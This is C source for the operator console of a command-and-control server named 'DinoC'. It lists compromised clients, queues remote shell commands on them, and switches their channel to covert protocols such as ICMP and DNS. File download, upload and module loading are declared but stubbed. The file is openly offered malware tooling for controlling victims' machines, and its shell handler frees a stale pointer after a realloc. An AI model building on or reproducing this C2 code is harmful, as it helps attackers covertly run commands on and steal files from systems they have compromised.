/**
 * @file console.c
 * @brief Console interface implementation for C2 server
 */

#include "../include/console.h"
#include "../include/client.h"
#include "../include/task.h"
#include "../include/protocol.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <ctype.h>
#include <readline/readline.h>
#include <readline/history.h>

// Console commands
static console_command_t* commands = NULL;
static size_t commands_count = 0;
static pthread_mutex_t commands_mutex = PTHREAD_MUTEX_INITIALIZER;

// Console thread
static pthread_t console_thread_id;
static bool console_thread_running = false;
static pthread_mutex_t console_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t console_cond = PTHREAD_COND_INITIALIZER;

// Forward declarations for built-in commands
static status_t console_cmd_help(int argc, char** argv);
static status_t console_cmd_exit(int argc, char** argv);
static status_t console_cmd_clients(int argc, char** argv);
static status_t console_cmd_tasks(int argc, char** argv);
static status_t console_cmd_listeners(int argc, char** argv);
static status_t console_cmd_shell(int argc, char** argv);
static status_t console_cmd_download(int argc, char** argv);
static status_t console_cmd_upload(int argc, char** argv);
static status_t console_cmd_module(int argc, char** argv);
static status_t console_cmd_config(int argc, char** argv);
static status_t console_cmd_switch(int argc, char** argv);

// Forward declarations for helper functions
static status_t console_parse_line(char* line, int* argc, char*** argv);
static status_t console_execute_command(int argc, char** argv);
static void console_free_args(int argc, char** argv);
static void* console_thread(void* arg);

/**
 * @brief Initialize console
 */
status_t console_init(void) {
    // Initialize commands
    commands = NULL;
    commands_count = 0;
    
    // Register built-in commands
    console_register_command("help", "Display help information", "help [command]", console_cmd_help);
    console_register_command("exit", "Exit console", "exit", console_cmd_exit);
    console_register_command("clients", "List clients", "clients [id]", console_cmd_clients);
    console_register_command("tasks", "List tasks", "tasks [id]", console_cmd_tasks);
    console_register_command("listeners", "List protocol listeners", "listeners [type]", console_cmd_listeners);
    console_register_command("shell", "Execute shell command on client", "shell <client_id> <command>", console_cmd_shell);
    console_register_command("download", "Download file from client", "download <client_id> <remote_path> [local_path]", console_cmd_download);
    console_register_command("upload", "Upload file to client", "upload <client_id> <local_path> <remote_path>", console_cmd_upload);
    console_register_command("module", "Manage client modules", "module <client_id> <load|unload> <module_name> [module_path]", console_cmd_module);
    console_register_command("config", "Configure client", "config <client_id> <key> <value>", console_cmd_config);
    console_register_command("switch", "Switch client protocol", "switch <client_id> <protocol_type>", console_cmd_switch);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Start console
 */
status_t console_start(void) {
    pthread_mutex_lock(&console_mutex);
    
    if (console_thread_running) {
        pthread_mutex_unlock(&console_mutex);
        return STATUS_ERROR_ALREADY_RUNNING;
    }
    
    console_thread_running = true;
    
    if (pthread_create(&console_thread_id, NULL, console_thread, NULL) != 0) {
        console_thread_running = false;
        pthread_mutex_unlock(&console_mutex);
        return STATUS_ERROR;
    }
    
    pthread_mutex_unlock(&console_mutex);
    return STATUS_SUCCESS;
}

/**
 * @brief Stop console
 */
status_t console_stop(void) {
    pthread_mutex_lock(&console_mutex);
    
    if (!console_thread_running) {
        pthread_mutex_unlock(&console_mutex);
        return STATUS_ERROR_NOT_RUNNING;
    }
    
    console_thread_running = false;
    pthread_cond_signal(&console_cond);
    pthread_mutex_unlock(&console_mutex);
    
    pthread_join(console_thread_id, NULL);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Shutdown console
 */
status_t console_shutdown(void) {
    // Stop console thread if running
    if (console_thread_running) {
        console_stop();
    }
    
    // Free commands
    pthread_mutex_lock(&commands_mutex);
    
    for (size_t i = 0; i < commands_count; i++) {
        free(commands[i].name);
        free(commands[i].description);
        free(commands[i].usage);
    }
    
    free(commands);
    commands = NULL;
    commands_count = 0;
    
    pthread_mutex_unlock(&commands_mutex);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Register console command
 */
status_t console_register_command(const char* name, const char* description, const char* usage, console_command_func_t handler) {
    if (name == NULL || description == NULL || usage == NULL || handler == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    pthread_mutex_lock(&commands_mutex);
    
    // Check if command already exists
    for (size_t i = 0; i < commands_count; i++) {
        if (strcmp(commands[i].name, name) == 0) {
            pthread_mutex_unlock(&commands_mutex);
            return STATUS_ERROR_ALREADY_RUNNING;
        }
    }
    
    // Allocate memory for new command
    console_command_t* new_commands = realloc(commands, (commands_count + 1) * sizeof(console_command_t));
    if (new_commands == NULL) {
        pthread_mutex_unlock(&commands_mutex);
        return STATUS_ERROR_MEMORY;
    }
    
    commands = new_commands;
    
    // Initialize new command
    commands[commands_count].name = strdup(name);
    commands[commands_count].description = strdup(description);
    commands[commands_count].usage = strdup(usage);
    commands[commands_count].handler = handler;
    
    if (commands[commands_count].name == NULL || 
        commands[commands_count].description == NULL || 
        commands[commands_count].usage == NULL) {
        
        free(commands[commands_count].name);
        free(commands[commands_count].description);
        free(commands[commands_count].usage);
        
        pthread_mutex_unlock(&commands_mutex);
        return STATUS_ERROR_MEMORY;
    }
    
    commands_count++;
    
    pthread_mutex_unlock(&commands_mutex);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Console thread function
 */
static void* console_thread(void* arg) {
    char* line = NULL;
    
    printf("DinoC C2 Console\n");
    printf("Type 'help' for available commands\n");
    
    while (console_thread_running) {
        // Read line from console
        line = readline("DinoC> ");
        
        if (line == NULL) {
            // EOF received, exit console
            console_thread_running = false;
            break;
        }
        
        // Skip empty lines
        if (line[0] == '\0') {
            free(line);
            continue;
        }
        
        // Add line to history
        add_history(line);
        
        // Parse and execute command
        int argc = 0;
        char** argv = NULL;
        
        status_t status = console_parse_line(line, &argc, &argv);
        if (status == STATUS_SUCCESS) {
            console_execute_command(argc, argv);
            console_free_args(argc, argv);
        }
        
        free(line);
    }
    
    return NULL;
}

/**
 * @brief Parse command line
 */
static status_t console_parse_line(char* line, int* argc, char*** argv) {
    if (line == NULL || argc == NULL || argv == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Count arguments
    int count = 0;
    bool in_quotes = false;
    bool in_arg = false;
    
    for (char* p = line; *p != '\0'; p++) {
        if (*p == '"') {
            in_quotes = !in_quotes;
        } else if (isspace((unsigned char)*p)) {
            if (in_quotes) {
                // Space inside quotes, continue
                continue;
            } else if (in_arg) {
                // End of argument
                in_arg = false;
            }
        } else if (!in_arg) {
            // Start of argument
            in_arg = true;
            count++;
        }
    }
    
    if (in_quotes) {
        // Unmatched quotes
        fprintf(stderr, "Error: Unmatched quotes\n");
        return STATUS_ERROR;
    }
    
    // Allocate argument array
    char** args = malloc((count + 1) * sizeof(char*));
    if (args == NULL) {
        return STATUS_ERROR_MEMORY;
    }
    
    // Parse arguments
    int i = 0;
    in_quotes = false;
    in_arg = false;
    char* arg_start = NULL;
    
    for (char* p = line; ; p++) {
        if (*p == '"') {
            in_quotes = !in_quotes;
            
            if (!in_arg) {
                // Start of quoted argument
                in_arg = true;
                arg_start = p + 1;
            } else if (*(p + 1) == '\0' || isspace((unsigned char)*(p + 1))) {
                // End of quoted argument
                *p = '\0';
                args[i++] = strdup(arg_start);
                in_arg = false;
            }
        } else if (*p == '\0' || (isspace((unsigned char)*p) && !in_quotes)) {
            if (in_arg) {
                // End of argument
                if (*p != '\0') {
                    *p = '\0';
                }
                args[i++] = strdup(arg_start);
                in_arg = false;
            }
            
            if (*p == '\0') {
                break;
            }
        } else if (!in_arg) {
            // Start of argument
            in_arg = true;
            arg_start = p;
        }
    }
    
    args[i] = NULL;
    
    *argc = count;
    *argv = args;
    
    return STATUS_SUCCESS;
}

/**
 * @brief Execute command
 */
static status_t console_execute_command(int argc, char** argv) {
    if (argc == 0 || argv == NULL || argv[0] == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    pthread_mutex_lock(&commands_mutex);
    
    // Find command
    for (size_t i = 0; i < commands_count; i++) {
        if (strcmp(commands[i].name, argv[0]) == 0) {
            // Execute command
            console_command_func_t handler = commands[i].handler;
            pthread_mutex_unlock(&commands_mutex);
            
            return handler(argc, argv);
        }
    }
    
    pthread_mutex_unlock(&commands_mutex);
    
    // Command not found
    fprintf(stderr, "Error: Unknown command '%s'\n", argv[0]);
    fprintf(stderr, "Type 'help' for available commands\n");
    
    return STATUS_ERROR_NOT_FOUND;
}

/**
 * @brief Free argument array
 */
static void console_free_args(int argc, char** argv) {
    if (argv == NULL) {
        return;
    }
    
    for (int i = 0; i < argc; i++) {
        free(argv[i]);
    }
    
    free(argv);
}

/**
 * @brief Help command handler
 */
static status_t console_cmd_help(int argc, char** argv) {
    pthread_mutex_lock(&commands_mutex);
    
    if (argc == 1) {
        // List all commands
        printf("Available commands:\n");
        
        for (size_t i = 0; i < commands_count; i++) {
            printf("  %-15s %s\n", commands[i].name, commands[i].description);
        }
        
        printf("\nType 'help <command>' for detailed usage information\n");
    } else {
        // Show help for specific command
        for (size_t i = 0; i < commands_count; i++) {
            if (strcmp(commands[i].name, argv[1]) == 0) {
                printf("Command: %s\n", commands[i].name);
                printf("Description: %s\n", commands[i].description);
                printf("Usage: %s\n", commands[i].usage);
                pthread_mutex_unlock(&commands_mutex);
                return STATUS_SUCCESS;
            }
        }
        
        fprintf(stderr, "Error: Unknown command '%s'\n", argv[1]);
    }
    
    pthread_mutex_unlock(&commands_mutex);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Exit command handler
 */
static status_t console_cmd_exit(int argc, char** argv) {
    console_thread_running = false;
    return STATUS_SUCCESS;
}

/**
 * @brief Clients command handler
 */
static status_t console_cmd_clients(int argc, char** argv) {
    if (argc > 2) {
        fprintf(stderr, "Usage: clients [id]\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    if (argc == 1) {
        // List all clients
        client_t** clients = NULL;
        size_t count = 0;
        
        status_t status = client_get_all(&clients, &count);
        if (status != STATUS_SUCCESS) {
            fprintf(stderr, "Error: Failed to get clients: %d\n", status);
            return status;
        }
        
        if (count == 0) {
            printf("No clients connected\n");
        } else {
            printf("Connected clients (%zu):\n", count);
            printf("%-36s %-15s %-20s %-10s %-20s\n", "ID", "IP Address", "Hostname", "State", "Last Seen");
            printf("--------------------------------------------------------------------------------\n");
            
            for (size_t i = 0; i < count; i++) {
                char id_str[37];
                // Convert UUID to string
                snprintf(id_str, sizeof(id_str), "%08x-%04x-%04x-%04x-%012x",
                         clients[i]->id.time_low,
                         clients[i]->id.time_mid,
                         clients[i]->id.time_hi_and_version,
                         clients[i]->id.clock_seq,
                         clients[i]->id.node);
                
                char state_str[20];
                switch (clients[i]->state) {
                    case CLIENT_STATE_CONNECTED:
                        strcpy(state_str, "Connected");
                        break;
                    case CLIENT_STATE_REGISTERED:
                        strcpy(state_str, "Registered");
                        break;
                    case CLIENT_STATE_ACTIVE:
                        strcpy(state_str, "Active");
                        break;
                    case CLIENT_STATE_INACTIVE:
                        strcpy(state_str, "Inactive");
                        break;
                    case CLIENT_STATE_DISCONNECTED:
                        strcpy(state_str, "Disconnected");
                        break;
                    default:
                        strcpy(state_str, "Unknown");
                        break;
                }
                
                char last_seen_str[30];
                struct tm* timeinfo = localtime(&clients[i]->last_seen);
                strftime(last_seen_str, sizeof(last_seen_str), "%Y-%m-%d %H:%M:%S", timeinfo);
                
                printf("%-36s %-15s %-20s %-10s %-20s\n",
                       id_str,
                       clients[i]->ip_address ? clients[i]->ip_address : "Unknown",
                       clients[i]->hostname ? clients[i]->hostname : "Unknown",
                       state_str,
                       last_seen_str);
            }
        }
        
        // Free client array
        free(clients);
    } else {
        // Show client details
        uuid_t id;
        // Parse UUID from string
        // This is a simplified version, in a real implementation you would use a proper UUID parsing function
        if (sscanf(argv[1], "%08x-%04x-%04x-%04x-%012x",
                  &id.time_low,
                  &id.time_mid,
                  &id.time_hi_and_version,
                  &id.clock_seq,
                  &id.node) != 5) {
            fprintf(stderr, "Error: Invalid client ID format\n");
            return STATUS_ERROR_INVALID_PARAM;
        }
        
        client_t* client = client_find(&id);
        if (client == NULL) {
            fprintf(stderr, "Error: Client not found\n");
            return STATUS_ERROR_NOT_FOUND;
        }
        
        printf("Client Details:\n");
        printf("ID: %08x-%04x-%04x-%04x-%012x\n",
               client->id.time_low,
               client->id.time_mid,
               client->id.time_hi_and_version,
               client->id.clock_seq,
               client->id.node);
        printf("IP Address: %s\n", client->ip_address ? client->ip_address : "Unknown");
        printf("Hostname: %s\n", client->hostname ? client->hostname : "Unknown");
        printf("OS Info: %s\n", client->os_info ? client->os_info : "Unknown");
        
        char state_str[20];
        switch (client->state) {
            case CLIENT_STATE_CONNECTED:
                strcpy(state_str, "Connected");
                break;
            case CLIENT_STATE_REGISTERED:
                strcpy(state_str, "Registered");
                break;
            case CLIENT_STATE_ACTIVE:
                strcpy(state_str, "Active");
                break;
            case CLIENT_STATE_INACTIVE:
                strcpy(state_str, "Inactive");
                break;
            case CLIENT_STATE_DISCONNECTED:
                strcpy(state_str, "Disconnected");
                break;
            default:
                strcpy(state_str, "Unknown");
                break;
        }
        printf("State: %s\n", state_str);
        
        char first_seen_str[30];
        struct tm* timeinfo = localtime(&client->first_seen);
        strftime(first_seen_str, sizeof(first_seen_str), "%Y-%m-%d %H:%M:%S", timeinfo);
        printf("First Seen: %s\n", first_seen_str);
        
        char last_seen_str[30];
        timeinfo = localtime(&client->last_seen);
        strftime(last_seen_str, sizeof(last_seen_str), "%Y-%m-%d %H:%M:%S", timeinfo);
        printf("Last Seen: %s\n", last_seen_str);
        
        char last_heartbeat_str[30];
        timeinfo = localtime(&client->last_heartbeat);
        strftime(last_heartbeat_str, sizeof(last_heartbeat_str), "%Y-%m-%d %H:%M:%S", timeinfo);
        printf("Last Heartbeat: %s\n", last_heartbeat_str);
        
        printf("Heartbeat Interval: %u seconds\n", client->heartbeat_interval);
        printf("Heartbeat Jitter: %u seconds\n", client->heartbeat_jitter);
        
        printf("Protocol: ");
        switch (client->listener->protocol_type) {
            case PROTOCOL_TYPE_TCP:
                printf("TCP\n");
                break;
            case PROTOCOL_TYPE_UDP:
                printf("UDP\n");
                break;
            case PROTOCOL_TYPE_WS:
                printf("WebSocket\n");
                break;
            case PROTOCOL_TYPE_ICMP:
                printf("ICMP\n");
                break;
            case PROTOCOL_TYPE_DNS:
                printf("DNS\n");
                break;
            default:
                printf("Unknown\n");
                break;
        }
        
        printf("Loaded Modules: %zu\n", client->modules_count);
        // In a real implementation, you would list the loaded modules here
    }
    
    return STATUS_SUCCESS;
}

/**
 * @brief Tasks command handler
 */
static status_t console_cmd_tasks(int argc, char** argv) {
    if (argc > 2) {
        fprintf(stderr, "Usage: tasks [id]\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    if (argc == 1) {
        // List all tasks
        // In a real implementation, you would get all tasks from the task manager
        printf("Task listing not implemented yet\n");
    } else {
        // Show task details
        // In a real implementation, you would get the task details from the task manager
        printf("Task details not implemented yet\n");
    }
    
    return STATUS_SUCCESS;
}

/**
 * @brief Listeners command handler
 */
static status_t console_cmd_listeners(int argc, char** argv) {
    if (argc > 2) {
        fprintf(stderr, "Usage: listeners [type]\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // In a real implementation, you would get the listeners from the protocol manager
    printf("Listener listing not implemented yet\n");
    
    return STATUS_SUCCESS;
}

/**
 * @brief Shell command handler
 */
static status_t console_cmd_shell(int argc, char** argv) {
    if (argc < 3) {
        fprintf(stderr, "Usage: shell <client_id> <command>\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Parse client ID
    uuid_t client_id;
    if (sscanf(argv[1], "%08x-%04x-%04x-%04x-%012x",
              &client_id.time_low,
              &client_id.time_mid,
              &client_id.time_hi_and_version,
              &client_id.clock_seq,
              &client_id.node) != 5) {
        fprintf(stderr, "Error: Invalid client ID format\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Find client
    client_t* client = client_find(&client_id);
    if (client == NULL) {
        fprintf(stderr, "Error: Client not found\n");
        return STATUS_ERROR_NOT_FOUND;
    }
    
    // Build command string
    char* command = argv[2];
    for (int i = 3; i < argc; i++) {
        size_t command_len = strlen(command);
        size_t arg_len = strlen(argv[i]);
        
        char* new_command = realloc(command, command_len + arg_len + 2);
        if (new_command == NULL) {
            fprintf(stderr, "Error: Memory allocation failed\n");
            return STATUS_ERROR_MEMORY;
        }
        
        command = new_command;
        command[command_len] = ' ';
        strcpy(command + command_len + 1, argv[i]);
    }
    
    // Create task
    task_t* task = NULL;
    status_t status = task_create(&client_id, TASK_TYPE_SHELL, (const uint8_t*)command, strlen(command), 60, &task);
    
    if (status != STATUS_SUCCESS) {
        fprintf(stderr, "Error: Failed to create task: %d\n", status);
        return status;
    }
    
    printf("Task created: %08x-%04x-%04x-%04x-%012x\n",
           task->id.time_low,
           task->id.time_mid,
           task->id.time_hi_and_version,
           task->id.clock_seq,
           task->id.node);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Download command handler
 */
static status_t console_cmd_download(int argc, char** argv) {
    if (argc < 3 || argc > 4) {
        fprintf(stderr, "Usage: download <client_id> <remote_path> [local_path]\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Parse client ID
    uuid_t client_id;
    if (sscanf(argv[1], "%08x-%04x-%04x-%04x-%012x",
              &client_id.time_low,
              &client_id.time_mid,
              &client_id.time_hi_and_version,
              &client_id.clock_seq,
              &client_id.node) != 5) {
        fprintf(stderr, "Error: Invalid client ID format\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Find client
    client_t* client = client_find(&client_id);
    if (client == NULL) {
        fprintf(stderr, "Error: Client not found\n");
        return STATUS_ERROR_NOT_FOUND;
    }
    
    // Get remote path
    const char* remote_path = argv[2];
    
    // Get local path (use remote path basename if not specified)
    const char* local_path = NULL;
    if (argc == 4) {
        local_path = argv[3];
    } else {
        // Extract basename from remote path
        const char* basename = strrchr(remote_path, '/');
        if (basename == NULL) {
            basename = remote_path;
        } else {
            basename++;
        }
        
        local_path = basename;
    }
    
    // Create download task
    // In a real implementation, you would create a download task with the remote and local paths
    printf("Download task not implemented yet\n");
    
    return STATUS_SUCCESS;
}

/**
 * @brief Upload command handler
 */
static status_t console_cmd_upload(int argc, char** argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: upload <client_id> <local_path> <remote_path>\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Parse client ID
    uuid_t client_id;
    if (sscanf(argv[1], "%08x-%04x-%04x-%04x-%012x",
              &client_id.time_low,
              &client_id.time_mid,
              &client_id.time_hi_and_version,
              &client_id.clock_seq,
              &client_id.node) != 5) {
        fprintf(stderr, "Error: Invalid client ID format\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Find client
    client_t* client = client_find(&client_id);
    if (client == NULL) {
        fprintf(stderr, "Error: Client not found\n");
        return STATUS_ERROR_NOT_FOUND;
    }
    
    // Get local path
    const char* local_path = argv[2];
    
    // Get remote path
    const char* remote_path = argv[3];
    
    // Create upload task
    // In a real implementation, you would create an upload task with the local and remote paths
    printf("Upload task not implemented yet\n");
    
    return STATUS_SUCCESS;
}

/**
 * @brief Module command handler
 */
static status_t console_cmd_module(int argc, char** argv) {
    if (argc < 4 || argc > 5) {
        fprintf(stderr, "Usage: module <client_id> <load|unload> <module_name> [module_path]\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Parse client ID
    uuid_t client_id;
    if (sscanf(argv[1], "%08x-%04x-%04x-%04x-%012x",
              &client_id.time_low,
              &client_id.time_mid,
              &client_id.time_hi_and_version,
              &client_id.clock_seq,
              &client_id.node) != 5) {
        fprintf(stderr, "Error: Invalid client ID format\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Find client
    client_t* client = client_find(&client_id);
    if (client == NULL) {
        fprintf(stderr, "Error: Client not found\n");
        return STATUS_ERROR_NOT_FOUND;
    }
    
    // Get operation
    const char* operation = argv[2];
    
    // Get module name
    const char* module_name = argv[3];
    
    if (strcmp(operation, "load") == 0) {
        // Load module
        if (argc != 5) {
            fprintf(stderr, "Usage: module <client_id> load <module_name> <module_path>\n");
            return STATUS_ERROR_INVALID_PARAM;
        }
        
        // Get module path
        const char* module_path = argv[4];
        
        // Load module
        // In a real implementation, you would load the module from the specified path
        printf("Module loading not implemented yet\n");
    } else if (strcmp(operation, "unload") == 0) {
        // Unload module
        if (argc != 4) {
            fprintf(stderr, "Usage: module <client_id> unload <module_name>\n");
            return STATUS_ERROR_INVALID_PARAM;
        }
        
        // Unload module
        // In a real implementation, you would unload the specified module
        printf("Module unloading not implemented yet\n");
    } else {
        fprintf(stderr, "Error: Invalid operation '%s'\n", operation);
        fprintf(stderr, "Valid operations: load, unload\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    return STATUS_SUCCESS;
}

/**
 * @brief Config command handler
 */
static status_t console_cmd_config(int argc, char** argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: config <client_id> <key> <value>\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Parse client ID
    uuid_t client_id;
    if (sscanf(argv[1], "%08x-%04x-%04x-%04x-%012x",
              &client_id.time_low,
              &client_id.time_mid,
              &client_id.time_hi_and_version,
              &client_id.clock_seq,
              &client_id.node) != 5) {
        fprintf(stderr, "Error: Invalid client ID format\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Find client
    client_t* client = client_find(&client_id);
    if (client == NULL) {
        fprintf(stderr, "Error: Client not found\n");
        return STATUS_ERROR_NOT_FOUND;
    }
    
    // Get key and value
    const char* key = argv[2];
    const char* value = argv[3];
    
    // Set configuration
    // In a real implementation, you would set the configuration for the client
    printf("Configuration setting not implemented yet\n");
    
    return STATUS_SUCCESS;
}

/**
 * @brief Switch command handler
 */
static status_t console_cmd_switch(int argc, char** argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: switch <client_id> <protocol_type>\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Parse client ID
    uuid_t client_id;
    if (sscanf(argv[1], "%08x-%04x-%04x-%04x-%012x",
              &client_id.time_low,
              &client_id.time_mid,
              &client_id.time_hi_and_version,
              &client_id.clock_seq,
              &client_id.node) != 5) {
        fprintf(stderr, "Error: Invalid client ID format\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Find client
    client_t* client = client_find(&client_id);
    if (client == NULL) {
        fprintf(stderr, "Error: Client not found\n");
        return STATUS_ERROR_NOT_FOUND;
    }
    
    // Get protocol type
    const char* protocol_type_str = argv[2];
    protocol_type_t protocol_type;
    
    if (strcmp(protocol_type_str, "tcp") == 0) {
        protocol_type = PROTOCOL_TYPE_TCP;
    } else if (strcmp(protocol_type_str, "udp") == 0) {
        protocol_type = PROTOCOL_TYPE_UDP;
    } else if (strcmp(protocol_type_str, "ws") == 0) {
        protocol_type = PROTOCOL_TYPE_WS;
    } else if (strcmp(protocol_type_str, "icmp") == 0) {
        protocol_type = PROTOCOL_TYPE_ICMP;
    } else if (strcmp(protocol_type_str, "dns") == 0) {
        protocol_type = PROTOCOL_TYPE_DNS;
    } else {
        fprintf(stderr, "Error: Invalid protocol type '%s'\n", protocol_type_str);
        fprintf(stderr, "Valid protocol types: tcp, udp, ws, icmp, dns\n");
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Switch protocol
    status_t status = client_switch_protocol(client, protocol_type);
    
    if (status != STATUS_SUCCESS) {
        fprintf(stderr, "Error: Failed to switch protocol: %d\n", status);
        return status;
    }
    
    printf("Protocol switched to %s\n", protocol_type_str);
    
    return STATUS_SUCCESS;
}
